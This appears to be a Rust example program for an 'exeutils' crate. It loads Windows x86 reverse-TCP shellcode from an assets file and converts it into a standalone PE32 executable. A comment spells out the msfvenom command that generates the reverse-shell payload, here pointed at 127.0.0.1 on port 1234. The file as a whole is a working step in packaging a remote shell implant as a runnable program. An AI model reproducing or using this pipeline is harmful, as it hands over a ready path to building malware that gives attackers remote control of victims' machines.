use std::env::current_dir;
use std::fs::{self, File};
use std::io::Write;

use exeutils::pe32;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'windows/x86/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'windows' --arch 'x86' --out windows-x86-shell_reverse_tcp.bin
    let shellcode_path = format!("{}/assets/windows-x86-shell_reverse_tcp.bin", cwd);

    let shellcode_bytes = fs::read(shellcode_path).expect("Failed to open file");

    let pe_bytes = pe32::shellcode_to_exe(&shellcode_bytes);

    let pe_path = format!("{}/assets/converted.exe", cwd);

    let mut file = File::create(&pe_path).unwrap();
    file.write_all(&pe_bytes).unwrap();
}
